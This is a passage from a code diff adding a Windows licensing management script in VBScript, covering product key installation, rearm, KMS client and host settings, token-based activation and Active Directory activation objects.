+    bIsKMS = False
+
+    On Error Resume Next
+
+    set objService = GetServiceObject("Version")
+    strVersion = objService.Version
+    objService.InstallProductKey(strProductKey)
+    QuitIfError()
+
+    ' Installing a product key could change Windows licensing state.
+    ' Since the service determines if it can shut down and when is the next start time
+    ' based on the licensing state we should reconsume the licenses here.
+    objService.RefreshLicenseStatus()
+
+    For Each objProduct in GetProductCollection(ProductIsPrimarySkuSelectClause, PartialProductKeyNonNullWhereClause)
+        strDescription = objProduct.Description
+
+        iIsPrimaryWindowsSku = GetIsPrimaryWindowsSKU(objProduct)
+        If (iIsPrimaryWindowsSku = 2) Then
+            OutputIndeterminateOperationWarning(objProduct)
+        End If
+
+        If IsKmsServer(strDescription) Then
+            bIsKMS = True
+            Exit For
+        End If
+    Next
+
+    If (bIsKMS = True) Then
+        ' Set the KMS version in the registry (64 and 32 bit versions)
+        lRet = SetRegistryStr(HKEY_LOCAL_MACHINE, SLKeyPath, "KeyManagementServiceVersion", strVersion)
+        If (lRet <> 0) Then
+            QuitWithError lRet
+        End If
+
+        If ExistsRegistryKey(HKEY_LOCAL_MACHINE, SLKeyPath32) Then
+            lRet = SetRegistryStr(HKEY_LOCAL_MACHINE, SLKeyPath32, "KeyManagementServiceVersion", strVersion)
+            If (lRet <> 0) Then
+                QuitWithError lRet
+            End If
+        End If
+    Else
+        ' Clear the KMS version in the registry (64 and 32 bit versions)
+        lRet = DeleteRegistryValue(HKEY_LOCAL_MACHINE, SLKeyPath, "KeyManagementServiceVersion")
+        If (lRet <> 0 And lRet <> 2 And lRet <> 5) Then
+            QuitWithError lRet
+        End If
+
+        lRet = DeleteRegistryValue(HKEY_LOCAL_MACHINE, SLKeyPath32, "KeyManagementServiceVersion")
+        If (lRet <> 0 And lRet <> 2 And lRet <> 5) Then
+            QuitWithError lRet
+        End If
+    End If
+
+    strOutput = Replace(GetResource("L_MsgInstalledPKey"), "%PKEY%", strProductKey)
+    LineOut strOutput
+End Sub
+
+Private Sub OutputIndeterminateOperationWarning(objProduct)
+    Dim strOutput
+
+    LineOut GetResource("L_MsgUndeterminedPrimaryKeyOperation")
+    strOutput = Replace(GetResource("L_MsgUndeterminedOperationFormat"), "%PRODUCTDESCRIPTION%", objProduct.Description)
+    strOutput = Replace(strOutput, "%PRODUCTID%", objProduct.ID)
+    LineOut strOutput
+End Sub
+
+Private Sub ClearPKeyFromRegistry()
+    Dim objService
+
+    On Error Resume Next
+
+    set objService = GetServiceObject("Version")
+    QuitIfError()
+
+    objService.ClearProductKeyFromRegistry()
+    QuitIfError()
+
+    LineOut GetResource("L_MsgClearedPKey")
+End Sub
+
+Private Sub InstallLicenseFiles (strParentDirectory, fso)
+    Dim file, files, folder, subFolder
+
+    Set folder = fso.GetFolder(strParentDirectory)
+    Set files = folder.Files
+
+    ' Install all license files in folder
+    For Each file In files
+        If Right(file.Name, 7) = ".xrm-ms" Then
+            InstallLicense strParentDirectory & "\" & file.Name
+        End If
+    Next
+
+    For Each subFolder in folder.SubFolders
+        InstallLicenseFiles subFolder, fso
+    Next
+End Sub
+
+Private Sub ReinstallLicenses()
+    Dim shell, fso, strOemFolder
+    Dim strSppTokensFolder, folder, subFolder
+    Set shell = WScript.CreateObject("WScript.Shell")
+    Set fso = CreateObject("Scripting.FileSystemObject")
+
+    strOemFolder = shell.ExpandEnvironmentStrings("%SystemRoot%") & "\system32\oem"
+    strSppTokensFolder = shell.ExpandEnvironmentStrings("%SystemRoot%") & "\system32\spp\tokens"
+
+    LineOut GetResource("L_MsgReinstallingLicenses")
+
+    Set folder = fso.GetFolder(strSppTokensFolder)
+
+    For Each subFolder in folder.SubFolders
+        InstallLicenseFiles subFolder, fso
+    Next
+
+    If (fso.FolderExists(strOemFolder)) Then
+        InstallLicenseFiles strOemFolder, fso
+    End If
+
+    LineOut GetResource("L_MsgLicensesReinstalled")
+End Sub
+
+Private Sub ReArmWindows
+    Dim objService
+
+    set objService = GetServiceObject("Version")
+    On Error Resume Next
+
+    objService.ReArmWindows()
+    QuitIfError()
+
+    LineOut GetResource("L_MsgRearm_1")
+    LineOut GetResource("L_MsgRearm_2")
+End Sub
+
+Private Sub ReArmApp(strSLID)
+    Dim objService
+
+    set objService = GetServiceObject("Version")
+    QuitIfError()
+
+    objService.ReArmApp(strSLID)
+    QuitIfError()
+
+    LineOut GetResource("L_MsgRearm_1")
+End Sub
+
+Private Sub ReArmSku(strSLID)
+    Dim objProductIter
+    Dim strSLActID
+    Dim strWhereClause
+    Dim bSkuFound
+
+    strSLID = LCase(strSLID)
+
+    bSkuFound = False
+
+    strWhereClause = "ID = '" & strSLID & "'"
+
+    For Each objProductIter in GetProductCollection("ID", strWhereClause)
+        strSLActID = objProductIter.ID
+
+        If (strSLID = LCase(strSLActID)) Then
+            bSkuFound = True
+            objProductIter.ReArmsku()
+            QuitIfError()
+            LineOut GetResource("L_MsgRearm_1")
+            Exit For
+        End If
+    Next
+
+    If (bSkuFound = False) Then
+        LineOut GetResource("L_MsgErrorProductNotFound")
+    End If
+    
+End Sub
+
+Private Sub ExpirationDatime(strActivationID)
+    Dim strWhereClause
+    Dim objProduct
+    Dim strSLActID, ls, graceRemaining, strEnds
+    Dim strOutput
+    Dim strDescription, bTBL, bAVMA
+    Dim iIsPrimaryWindowsSku
+    Dim bFound
+
+    strActivationID = LCase(strActivationID)
+
+    bFound = False
+
+    If strActivationId = "" Then
+        strWhereClause = "ApplicationId = '" & WindowsAppId & "'"
+    Else
+        strWhereClause = "ID = '" & Replace(strActivationID, "'", "")  & "'"
+    End If
+
+    strWhereClause = strWhereClause & " AND " & PartialProductKeyNonNullWhereClause
+
+    For Each objProduct in GetProductCollection(ProductIsPrimarySkuSelectClause & ", LicenseStatus, GracePeriodRemaining", strWhereClause)
+        
+        strSLActID = objProduct.ID
+        ls = objProduct.LicenseStatus
+        graceRemaining = objProduct.GracePeriodRemaining
+        strEnds = DateAdd("n", graceRemaining, Now)
+
+        bFound = True
+
+        iIsPrimaryWindowsSku = GetIsPrimaryWindowsSKU(objProduct)
+        If (strActivationID = "") And (iIsPrimaryWindowsSku = 2) Then
+            OutputIndeterminateOperationWarning(objProduct)
+        End If
+
+        strOutput = ""
+
+        If ls = 0 Then
+            strOutput = GetResource("L_MsgLicenseStatusUnlicensed")
+
+        ElseIf ls = 1 Then
+            If graceRemaining <> 0 Then
+
+                strDescription = objProduct.Description
+
+                bTBL = IsTBL(strDescription)
+
+                bAVMA = IsAVMA(strDescription)
+
+                If bTBL Then
+                    strOutput = Replace(GetResource("L_MsgLicenseStatusTBL"), "%ENDDATE%", strEnds)
+                ElseIf bAVMA Then
+                    strOutput = Replace(GetResource("L_MsgLicenseStatusAVMA"), "%ENDDATE%", strEnds)
+                Else
+                    strOutput = Replace(GetResource("L_MsgLicenseStatusVL"), "%ENDDATE%", strEnds)
+                End If
+            Else
+                strOutput = GetResource("L_MsgLicenseStatusLicensed")
+            End If
+
+        ElseIf ls = 2 Then
+            strOutput = Replace(GetResource("L_MsgLicenseStatusInitialGrace"), "%ENDDATE%", strEnds)
+        ElseIf ls = 3 Then
+            strOutput = Replace(GetResource("L_MsgLicenseStatusAdditionalGrace"), "%ENDDATE%", strEnds)
+        ElseIf ls = 4 Then
+            strOutput = Replace(GetResource("L_MsgLicenseStatusNonGenuineGrace"), "%ENDDATE%", strEnds)
+        ElseIf ls = 5 Then
+            strOutput =  GetResource("L_MsgLicenseStatusNotification")
+        ElseIf ls = 6 Then
+            strOutput = Replace(GetResource("L_MsgLicenseStatusExtendedGrace"), "%ENDDATE%", strEnds)
+        End If
+
+        If strOutput <> "" Then
+            LineOut objProduct.Name & ":"
+            Lineout "    " & strOutput
+        End If
+    Next
+
+    If True <> bFound Then
+        LineOut GetResource("L_MsgErrorPKey")
+    End If
+End Sub
+
+''
+'' Volume license service/client management
+''
+
+Private Sub QuitIfErrorRestoreKmsName(obj, strKmsName)
+    Dim objErr
+
+    If Err.Number <> 0 Then
+        set objErr = new CErr
+
+        If strKmsName = "" Then
+            obj.ClearKeyManagementServiceMachine()
+        Else
+            obj.SetKeyManagementServiceMachine(strKmsName)
+        End If
+
+        ShowError GetResource("L_MsgErrorText_8"), objErr
+        ExitScript objErr.Number
+    End If
+End Sub
+
+Private Function GetKmsClientObjectByActivationID(strActivationID)
+    Dim objProduct, objTarget
+
+    strActivationID = LCase(strActivationID)
+
+    Set objTarget = Nothing
+
+    On Error Resume Next
+
+    If strActivationID = "" Then
+        Set objTarget = GetServiceObject("Version, " & KMSClientLookupClause)
+        QuitIfError()
+    Else
+        For Each objProduct in GetProductCollection("ID, " & KMSClientLookupClause, EmptyWhereClause)
+            If (LCase(objProduct.ID) = strActivationID) Then
+                Set objTarget = objProduct
+                Exit For
+            End If
+        Next
+
+        If objTarget is Nothing Then
+            Lineout Replace(GetResource("L_MsgErrorActivationID"), "%ActID%", strActivationID)
+        End If
+    End If
+
+    Set GetKmsClientObjectByActivationID = objTarget
+End Function
+
+Private Sub SetKmsMachineName(strKmsNamePort, strActivationID)
+    Dim objTarget
+    Dim nColon, strKmsName, strKmsNamePrev, strKmsPort, nBracketEnd
+    Dim nKmsPort
+
+    nBracketEnd = InStr(StrKmsNamePort, "]")
+    If InStr(strKmsNamePort, "[") = 1 And nBracketEnd > 1 Then
+    ' IPV6 Address
+        If  Len(StrKmsNamePort) = nBracketEnd Then
+            'No Port Number
+            strKmsName = strKmsNamePort
+            strKmsPort = ""
+        Else
+            strKmsName = Left(strKmsNamePort, nBracketEnd)
+            strKmsPort = Right(strKmsNamePort, Len(strKmsNamePort) - nBracketEnd - 1)
+        End If
+    Else
+    ' IPV4 Address
+        nColon = InStr(1, strKmsNamePort, ":")
+        If nColon <> 0 Then
+            strKmsName = Left(strKmsNamePort, nColon - 1)
+            strKmsPort = Right(strKmsNamePort, Len(strKmsNamePort) - nColon)
+        Else
+            strKmsName = strKmsNamePort
+            strKmsPort = ""
+        End If
+    End If
+
+    Set objTarget = GetKmsClientObjectByActivationID(strActivationID)
+
+    On Error Resume Next
+
+    If Not objTarget is Nothing Then
+        strKmsNamePrev = objTarget.KeyManagementServiceMachine
+
+        If strKmsName <> "" Then
+            objTarget.SetKeyManagementServiceMachine(strKmsName)
+            QuitIfError()
+        End If
+
+        If strKmsPort <> "" Then
+            nKmsPort = CLng(strKmsPort)
+            QuitIfErrorRestoreKmsName objTarget, strKmsNamePrev
+            objTarget.SetKeyManagementServicePort(nKmsPort)
+            QuitIfErrorRestoreKmsName objTarget, strKmsNamePrev
+        Else
+            objTarget.ClearKeyManagementServicePort()
+            QuitIfErrorRestoreKmsName objTarget, strKmsNamePrev
+        End If
+
+        LineOut Replace(GetResource("L_MsgKmsNameSet"), "%KMS%", strKmsNamePort)
+
+        If objTarget.KeyManagementServiceLookupDomain <> "" Then
+            LineOut Replace(GetResource("L_MsgKmsUseMachineNameOverrides"), _
+                            "%KMS%", _
+                            strKmsNamePort)
+        End If
+    End If
+End Sub
+
+Private Sub ClearKms(strActivationID)
+    Dim objTarget
+
+    Set objTarget = GetKmsClientObjectByActivationID(strActivationID)
+
+    On Error Resume Next
+
+    If Not objTarget is Nothing Then
+        objTarget.ClearKeyManagementServiceMachine()
+        QuitIfError()
+        objTarget.ClearKeyManagementServicePort()
+        QuitIfError()
+
+        LineOut GetResource("L_MsgKmsNameCleared")
+
+        If objTarget.KeyManagementServiceLookupDomain <> "" Then
+            LineOut Replace(GetResource("L_MsgKmsUseLookupDomain"), _
+                            "%FQDN%", _
+                            objTarget.KeyManagementServiceLookupDomain)
+        End If
+    End If
+End Sub
+
+Private Sub SetKmsLookupDomain(strKmsLookupDomain, strActivationID)
+    Dim objTarget
+    Dim strKms, nPort
+
+    Set objTarget = GetKmsClientObjectByActivationID(strActivationID)
+
+    On Error Resume Next
+
+    If Not objTarget is Nothing Then
+        objTarget.SetKeyManagementServiceLookupDomain(strKmsLookupDomain)
+        QuitIfError()
+        
+        LineOut Replace(GetResource("L_MsgKmsLookupDomainSet"), "%FQDN%", strKmsLookupDomain)
+
+        If objTarget.KeyManagementServiceMachine <> "" Then
+            strKms = objTarget.KeyManagementServiceMachine
+            nPort  = objTarget.KeyManagementServicePort
+            LineOut Replace(GetResource("L_MsgKmsUseMachineNameOverrides"), _
+                            "%KMS%", strKms & ":" & nPort)
+        End If
+    End If
+End Sub
+
+Private Sub ClearKmsLookupDomain(strActivationID)
+    Dim objTarget
+    Dim strKms, nPort
+    
+    Set objTarget = GetKmsClientObjectByActivationID(strActivationID)
+
+    On Error Resume Next
+
+    If Not objTarget is Nothing Then
+        objTarget.ClearKeyManagementServiceLookupDomain
+        QuitIfError()
+
+        LineOut GetResource("L_MsgKmsLookupDomainCleared")
+
+        If objTarget.KeyManagementServiceMachine <> "" Then
+            strKms = objTarget.KeyManagementServiceMachine
+            nPort  = objTarget.KeyManagementServicePort
+            LineOut Replace(GetResource("L_MsgKmsUseMachineName"), _
+                            "%KMS%", strKms & ":" & nPort)
+        End If
+        
+    End If
+End Sub
+
+Private Sub SetHostCachingDisable(boolHostCaching)
+    Dim objService
+
+    On Error Resume Next
+
+    set objService = GetServiceObject("Version")
+    QuitIfError()
+
+    objService.DisableKeyManagementServiceHostCaching(boolHostCaching)
+    QuitIfError()
+
+    If boolHostCaching Then
+        LineOut GetResource("L_MsgKmsHostCachingDisabled")
+    Else
+        LineOut GetResource("L_MsgKmsHostCachingEnabled")
+    End If
+
+End Sub
+
+Private Sub SetActivationInterval(intInterval)
+    Dim objService, objProduct
+    Dim kmsFlag, strOutput
+
+    If (intInterval < 0) Then
+        LineOut GetResource("L_MsgInvalidDataError")
+        Exit Sub
+    End If
+
+    On Error Resume Next
+
+    set objService = GetServiceObject("Version")
+    QuitIfError()
+
+    For Each objProduct in GetProductCollection("ID, IsKeyManagementServiceMachine", PartialProductKeyNonNullWhereClause)
+        kmsFlag = objProduct.IsKeyManagementServiceMachine
+        If kmsFlag = 1 Then
+            objService.SetVLActivationInterval(intInterval)
+            QuitIfError()
+            strOutput = Replace(GetResource("L_MsgActivationSet"), "%ACTIVATION%", intInterval)
+            LineOut strOutput
+            LineOut GetResource("L_MsgWarningKmsReboot")
+
+            Exit For
+        End If
+    Next
+
+    If kmsFlag <> 1 Then
+        LineOut GetResource("L_MsgWarningActivation")
+    End If
+End Sub
+
+Private Sub SetRenewalInterval(intInterval)
+    Dim objService, objProduct
+    Dim kmsFlag, strOutput
+
+    If (intInterval < 0) Then
+        LineOut GetResource("L_MsgInvalidDataError")
+        Exit Sub
+    End If
+
+    On Error Resume Next
+
+    set objService = GetServiceObject("Version")
+    QuitIfError()
+
+    For Each objProduct in GetProductCollection("ID, IsKeyManagementServiceMachine", PartialProductKeyNonNullWhereClause)
+        kmsFlag = objProduct.IsKeyManagementServiceMachine
+        If kmsFlag Then
+            objService.SetVLRenewalInterval(intInterval)
+            QuitIfError()
+            strOutput = Replace(GetResource("L_MsgRenewalSet"), "%RENEWAL%", intInterval)
+            LineOut strOutput
+            LineOut GetResource("L_MsgWarningKmsReboot")
+
+            Exit For
+        End If
+    Next
+
+    If kmsFlag <> 1 Then
+        LineOut GetResource("L_MsgWarningRenewal")
+    End If
+End Sub
+
+Private Sub SetKmsListenPort(strPort)
+    Dim objService, objProduct
+    Dim kmsFlag, lRet, strOutput
+    Dim nPort
+
+    On Error Resume Next
+
+    set objService = GetServiceObject("Version")
+    QuitIfError()
+
+    For Each objProduct in GetProductCollection("ID, IsKeyManagementServiceMachine", PartialProductKeyNonNullWhereClause)
+        kmsFlag = objProduct.IsKeyManagementServiceMachine
+        If kmsFlag Then
+            nPort = CLng(strPort)
+            objService.SetKeyManagementServiceListeningPort(nPort)
+            QuitIfError()
+            strOutput = Replace(GetResource("L_MsgKmsPortSet"), "%PORT%", strPort)
+            LineOut strOutput
+            LineOut GetResource("L_MsgWarningKmsReboot")
+
+            Exit For
+        End If
+    Next
+
+    If kmsFlag <> 1 Then
+        LineOut GetResource("L_MsgWarningKmsPort")
+    End If
+End Sub
+
+Private Sub SetDnsPublishingDisabled(bool)
+    Dim objService, objProduct
+    Dim kmsFlag, lRet, dwValue
+
+    On Error Resume Next
+
+    set objService = GetServiceObject("Version")
+    QuitIfError()
+
+    For Each objProduct in GetProductCollection("ID, IsKeyManagementServiceMachine", PartialProductKeyNonNullWhereClause)
+        kmsFlag = objProduct.IsKeyManagementServiceMachine
+        If kmsFlag Then
+            objService.DisableKeyManagementServiceDnsPublishing(bool)
+            QuitIfError()
+
+            If bool Then
+                LineOut GetResource("L_MsgKmsDnsPublishingDisabled")
+            Else
+                LineOut GetResource("L_MsgKmsDnsPublishingEnabled")
+            End If
+            LineOut GetResource("L_MsgWarningKmsReboot")
+
+            Exit For
+        End If
+    Next
+
+    If kmsFlag <> 1 Then
+        LineOut GetResource("L_MsgKmsDnsPublishingWarning")
+    End If
+End Sub
+
+Private Sub SetKmsLowPriority(bool)
+    Dim objService, objProduct
+    Dim kmsFlag, lRet, dwValue
+
+    On Error Resume Next
+
+    set objService = GetServiceObject("Version")
+    QuitIfError()
+
+    For Each objProduct in GetProductCollection("ID, IsKeyManagementServiceMachine", PartialProductKeyNonNullWhereClause)
+        kmsFlag = objProduct.IsKeyManagementServiceMachine
+        If kmsFlag Then
+            objService.EnableKeyManagementServiceLowPriority(bool)
+            QuitIfError()
+
+            If bool Then
+                LineOut GetResource("L_MsgKmsPriSetToLow")
+            Else
+                LineOut GetResource("L_MsgKmsPriSetToNormal")
+            End If
+            LineOut GetResource("L_MsgWarningKmsReboot")
+        End If
+
+        Exit For
+    Next
+
+
+    If kmsFlag <> 1 Then
+       LineOut GetResource("L_MsgWarningKmsPri")
+    End If
+End Sub
+
+Private Sub SetVLActivationType(intType, strActivationID)
+    Dim objTarget
+    
+    If IsNull(intType) Then
+        intType = 0
+    End If
+
+    If (intType < 0) Or (intType > 3) Then
+        LineOut GetResource("L_MsgInvalidDataError")
+        Exit Sub
+    End If
+
+    Set objTarget = GetKmsClientObjectByActivationID(strActivationID)
+
+    On Error Resume Next
+
+    If Not objTarget is Nothing Then
+        If (intType <> 0) Then
+            objTarget.SetVLActivationTypeEnabled(intType)
+            QuitIfError()
+        Else
+            objTarget.ClearVLActivationTypeEnabled()
+            QuitIfError()
+        End If
+        
+        LineOut GetResource("L_MsgVLActivationTypeSet")
+    End If
+End Sub
+
+''
+'' Token-based Activation Commands
+''
+
+Private Function IsTokenActivated(objProduct)
+
+    Dim nILVID
+
+    On Error Resume Next
+
+    nILVID = objProduct.TokenActivationILVID
+
+    IsTokenActivated = ((Err.Number = 0) And (nILVID <> &HFFFFFFFF))
+
+End Function
+
+
+Private Sub TkaListILs
+    Dim objLicense
+    Dim strHeader
+    Dim strError
+    Dim strGuids
+    Dim arrGuids
+    Dim nListed
+
+    Dim objWmiDate
+
+    LineOut GetResource("L_MsgTkaLicenses")
+    LineOut ""
+
+    Set objWmiDate = CreateObject("WBemScripting.SWbemDateTime")
+
+    nListed = 0
+    For Each objLicense in g_objWMIService.InstancesOf(TkaLicenseClass)
+
+        strHeader = GetResource("L_MsgTkaLicenseHeader")
+        strHeader = Replace(strHeader, "%ILID%" , objLicense.ILID )
+        strHeader = Replace(strHeader, "%ILVID%", objLicense.ILVID)
+        LineOut strHeader
+
+        LineOut "    " & Replace(GetResource("L_MsgTkaLicenseILID"), "%ILID%", objLicense.ILID)
+        LineOut "    " & Replace(GetResource("L_MsgTkaLicenseILVID"), "%ILVID%", objLicense.ILVID)
+
+        If Not IsNull(objLicense.ExpirationDate) Then
+
+            objWmiDate.Value = objLicense.ExpirationDate
+
+            If (objWmiDate.GetFileTime(false) <> 0) Then
+                LineOut "    " & Replace(GetResource("L_MsgTkaLicenseExpiration"), "%TODATE%", objWmiDate.GetVarDate)
+            End If
+
+        End If
+
+        If Not IsNull(objLicense.AdditionalInfo) Then
+            LineOut "    " & Replace(GetResource("L_MsgTkaLicenseAdditionalInfo"), "%MOREINFO%", objLicense.AdditionalInfo)
+        End If
+
+        If Not IsNull(objLicense.AuthorizationStatus) And _
+           objLicense.AuthorizationStatus <> 0 _
+        Then
+            strError = CStr(Hex(objLicense.AuthorizationStatus))
+            LineOut "    " & Replace(GetResource("L_MsgTkaLicenseAuthZStatus"), "%ERRCODE%", strError)
+        Else
+            LineOut "    " & Replace(GetResource("L_MsgTkaLicenseDescr"), "%DESC%", objLicense.Description)
+        End If
+
+        LineOut ""
+        nListed = nListed + 1
+    Next
+
+    if 0 = nListed Then
+        LineOut GetResource("L_MsgTkaLicenseNone")
+    End If
+End Sub
+
+
+Private Sub TkaRemoveIL(strILID, strILVID)
+    Dim objLicense
+    Dim strMsg
+    Dim nRemoved
+
+    Dim nILVID
+
+    On Error Resume Next
+    nILVID = CInt(strILVID)
+    QuitIfError()
+
+    LineOut GetResource("L_MsgTkaRemoving")
+    LineOut ""
+
+    nRemoved = 0
+    For Each objLicense in g_objWMIService.InstancesOf(TkaLicenseClass)
+        If strILID = objLicense.ILID And nILVID = objLicense.ILVID Then
+            strMsg = GetResource("L_MsgTkaRemovedItem")
+            strMsg = Replace(strMsg, "%SLID%", objLicense.ID)
+
+            On Error Resume Next
+            objLicense.Uninstall
+            QuitIfError()
+            LineOut strMsg
+            nRemoved = nRemoved + 1
+        End If
+    Next
+
+    If nRemoved = 0 Then
+        LineOut GetResource("L_MsgTkaRemovedNone")
+    End If
+End Sub
+
+
+Private Sub TkaListCerts
+    Dim objProduct
+    Dim objSigner
+    Dim iRet
+    Dim arrGrants()
+    Dim arrThumbprints
+    Dim strThumbprint
+
+    On Error Resume Next
+
+    Set objSigner  = TkaGetSigner()
+    Set objProduct = TkaGetProduct()
+
+    iRet = objProduct.GetTokenActivationGrants(arrGrants)
+    QuitIfError()
+
+    arrThumbprints = objSigner.GetCertificateThumbprints(arrGrants)
+    QuitIfError()
+
+    For Each strThumbprint in arrThumbprints
+        TkaPrintCertificate strThumbprint
+    Next
+End Sub
+
+
+Private Sub TkaActivate(strThumbprint, strPin)
+    Dim objService
+    Dim objProduct
+    Dim objSigner
+    Dim iRet
+
+    Dim strChallenge
+
+    Dim strAuthInfo1
+    Dim strAuthInfo2
+
+    Set objSigner  = TkaGetSigner()
+    Set objProduct = TkaGetProduct()
+    Set objService = TkaGetService()
+
+    DisplayActivatingSku objProduct
+
+    On Error Resume Next
+
+    iRet = objProduct.GenerateTokenActivationChallenge(strChallenge)
+    QuitIfError()
+
+    strAuthInfo1 = objSigner.Sign(strChallenge, strThumbprint, strPin, strAuthInfo2)
+    QuitIfError()
+
+    iRet = objProduct.DepositTokenActivationResponse(strChallenge, strAuthInfo1, strAuthInfo2)
+    QuitIfError()
+
+    objService.RefreshLicenseStatus()
+    Err.Number = 0
+
+    objProduct.refresh_
+    DisplayActivatedStatus objProduct
+    QuitIfError()
+
+End Sub
+
+
+Private Function TkaGetService()
+
+    Set TkaGetService = GetServiceObject("Version")
+
+End Function
+
+
+Private Function TkaGetProduct()
+
+    Dim objWinProductsWithPKeyInstalled
+    Dim objProduct
+
+    On Error Resume Next
+
+    Set TkaGetProduct = Nothing
+
+    Set TkaGetProduct = GetProductObject( _
+                       "ID, Name, ApplicationId, PartialProductKey, Description, LicenseIsAddon ", _
+                       "ApplicationId = '" & WindowsAppId & "' " &_
+                       "AND PartialProductKey <> NULL " & _
+                       "AND LicenseIsAddon = FALSE" _
+                       )
+    QuitIfError()
+
+End Function
+
+Private Function TkaGetSigner()
+
+    On Error Resume Next
+    Set TkaGetSigner = WScript.CreateObject("SPPWMI.SppWmiTokenActivationSigner")
+    QuitIfError()
+
+End Function
+
+Private Sub TkaPrintCertificate(strThumbprint)
+    Dim arrParams
+
+    arrParams = Split(strThumbprint, "|")
+
+    LineOut ""
+    LineOut Replace(GetResource("L_MsgTkaCertThumbprint"), "%THUMBPRINT%", arrParams(0))
+    LineOut Replace(GetResource("L_MsgTkaCertSubject"   ), "%SUBJECT%"   , arrParams(1))
+    LineOut Replace(GetResource("L_MsgTkaCertIssuer"    ), "%ISSUER%"    , arrParams(2))
+    LineOut Replace(GetResource("L_MsgTkaCertValidFrom" ), "%FROMDATE%"  , FormatDateTime(CDate(arrParams(3)), vbShortDate))
+    LineOut Replace(GetResource("L_MsgTkaCertValidTo"   ), "%TODATE%"    , FormatDateTime(CDate(arrParams(4)), vbShortDate))
+End Sub
+
+''
+'' Active Directory Activation Commands
+''
+
+Private Function IsADActivated(objProduct)
+    On Error Resume Next
+
+    If (objProduct.VLActivationType = 1) Then
+        IsADActivated = True
+    Else
+        IsADActivated = False
+    End If
+
+End Function
+
+Private Sub ADActivateOnline(strProductKey, strActivationObjectName)
+    Dim objService
+
+    FailRemoteExec()
+
+    On Error Resume Next
+
+    set objService = GetServiceObject("Version")
+    QuitIfError()
+
+    objService.DoActiveDirectoryOnlineActivation strProductKey, strActivationObjectName
+    QuitIfError()
+
+    LineOut GetResource("L_MsgActivated")
+
+End Sub
+
+Private Sub ADGetIID(strProductKey)
+    Dim objService
+    Dim strIID
+
+    FailRemoteExec()
+
+    On Error Resume Next
+
+    set objService = GetServiceObject("Version")
+
+    objService.GenerateActiveDirectoryOfflineActivationId strProductKey, strIID
+    QuitIfError()
+
+    LineOut GetResource("L_MsgInstallationID") & strIID
+    LineOut ""
+    LineOut GetResource("L_MsgPhoneNumbers")
+
+End Sub
+
+Private Sub ADActivatePhone(strProductKey, strCID, strActivationObjectName)
+    Dim objService
+    Dim strIID
+
+    FailRemoteExec()
+
+    On Error Resume Next
+
+    set objService = GetServiceObject("Version")
+
+    objService.DepositActiveDirectoryOfflineActivationConfirmation strProductKey, strCID, strActivationObjectName
+    QuitIfError()
+
+    LineOut GetResource("L_MsgActivated")
+
+End Sub
+
+Private Sub ADListActivationObjects()
+    Dim machineDomain
+    Dim namespace
+    Dim rootDSE, configurationNC
+    Dim container, child
+    Dim found
+
+    FailRemoteExec()
+
+    On Error Resume Next
+
+    '
+    ' Fetch computer's domain name. This must be used while querying for
+    ' Activation Objects to ensure we do not query them from current user's
+    ' domain (which may be in a different forest than computer's domain).
+    '
+    machineDomain = GetMachineDomain()
+    QuitIfError()
+
+    set namespace = GetObject(ADLdapProvider)
+    QuitIfError()
+
+    set rootDSE = namespace.OpenDSObject(ADLdapProviderPrefix & machineDomain & ADRootDSE, vbNullString, vbNullString, ADS_READONLY_SERVER)
+    QuitIfError()
+
+    configurationNC = rootDSE.Get(ADConfigurationNC)
+    QuitIfError()
+
+    set container = namespace.OpenDSObject(ADLdapProviderPrefix & machineDomain & ADActObjContainer & configurationNC, vbNullString, vbNullString, ADS_READONLY_SERVER)
+    If Err.Number = HR_ERROR_DS_NO_SUCH_OBJECT Then
+        LineOut GetResource("L_MsgADSchemaNotSupported")
+        Exit Sub
+    End If
+    QuitIfError()
+
+    LineOut GetResource("L_MsgActObjAvailable")
+
+    found = False
+
+    For Each child in container
+        If child.Class = ADActObjClass Then
+            found = True
+            child.GetInfoEx Array(ADActObjDisplayName, ADActObjAttribDN, ADActObjAttribSkuId, ADActObjAttribPid), 0
+            LineOut "    " & GetResource("L_MsgADInfoAOName") & child.Get(ADActObjDisplayName)
+            LineOut "    " & "    " & GetResource("L_MsgActID") & GuidToString(child.Get(ADActObjAttribSkuId))
+            LineOut "    " & "    " & GetResource("L_MsgPartialPKey") & child.Get(ADActObjAttribPartialPkey)
+            LineOut "    " & "    " & GetResource("L_MsgADInfoExtendedPid") & child.Get(ADActObjAttribPid)
+            LineOut "    " & "    " & GetResource("L_MsgADInfoAODN") & child.Get(ADActObjAttribDN)
+            LineOut ""
+        End If
+    Next
+
+    If (found = False) Then
+        LineOut "    " & GetResource("L_MsgActObjNoneFound")
+    End If
+
+End Sub
+
+Private Sub ADDeleteActivationObjects(strName)
+    Dim machineDomain
+    Dim namespace
+    Dim rootDSE, configurationNC
+    Dim container, strDN
+    Dim object, parent
+
+    FailRemoteExec()
+
+    On Error Resume Next
+
+    machineDomain = GetMachineDomain()
+    QuitIfError()
+
+    set namespace = GetObject(ADLdapProvider)
+    QuitIfError()
+
+    set rootDSE = GetObject(ADLdapProviderPrefix & machineDomain & ADRootDSE)
+    QuitIfError()
+
+    configurationNC = rootDSE.Get(ADConfigurationNC)
+    QuitIfError()
+
+    '
+    ' Check if AD schema supports Activation Objects containers
+    '
+    set container = namespace.OpenDSObject(ADLdapProviderPrefix & machineDomain & ADActObjContainer & configurationNC, vbNullString, vbNullString, ADS_READONLY_SERVER)
+    If Err.Number = HR_ERROR_DS_NO_SUCH_OBJECT Then
+        LineOut GetResource("L_MsgADSchemaNotSupported")
+        Exit Sub
+    End If
+    QuitIfError()
+
+    If InStr(1, strName, ",cn=", vbTextCompare) > 0 Then
+        strDN = strName
+    Else
+        '
+        ' RDN was provided. Construct a full DN from it.
+        '
+
+        ' Use computer's domain name to construct the Activation Object DN.
+        If 1 = InStr(1, strName, "cn=", vbTextCompare) Then
+            strDN = strName & "," & ADActObjContainer & configurationNC
+        Else
+            strDN = "CN=" & strName & "," & ADActObjContainer & configurationNC
+        End If
+
+        LineOut "    " & GetResource("L_MsgADInfoAODN") & strDN
+        LineOut ""
+    End If
+
+    set object = GetObject(ADLdapProviderPrefix & strDN)
+    QuitIfError()
+
+    set parent = GetObject(object.Parent)
+    QuitIfError()
+
+    If (object.Class = ADActObjClass) Then
+        parent.Delete object.Class, object.Name
+        QuitIfError()
+    End If
+
+    LineOut GetResource("L_MsgSucess")
+
+End Sub
+
+' other generic options/helpers
+
+Private Sub LineOut(str)
+    g_EchoString = g_EchoString & str & vbNewLine
+End Sub
+
+Private Sub LineFlush(str)
+    WScript.Echo g_EchoString & str
+    g_EchoString = ""
+End Sub
+
+Private Sub ExitScript(retval)
+    if (g_EchoString <> "") Then
